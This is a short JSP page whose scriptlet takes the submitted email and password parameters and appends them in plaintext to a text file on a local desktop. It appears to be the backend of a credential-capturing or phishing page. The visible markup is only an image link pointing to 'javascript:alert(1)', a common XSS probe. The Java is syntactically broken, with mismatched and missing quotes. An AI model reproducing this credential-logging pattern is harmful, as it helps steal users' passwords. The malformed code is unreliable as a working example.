
<DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
<%
	String email=request.getParameter("Emailid");
	String password=request.getParameter("password");
	String path = "/Users/kanaga-3831/Desktop/file.txt";
          FileWriter filewriter = new FileWriter(path, true);
          filewriter.write("USERName: + email);
          filewriter.newLine();
          filewriter.write(PASSWORD: +password);
	  filewriter.write("*******************************");
          filewriter.close();
  %>  
        <a href="javascript:alert(1)">

                        <img border="0" alt="W3Schools" src="http://www.html.am/images/html-codes/links/boracay-white-beach-sunset-300x225.jpg" width="300" height="225">
         </a>

</body>
</html>
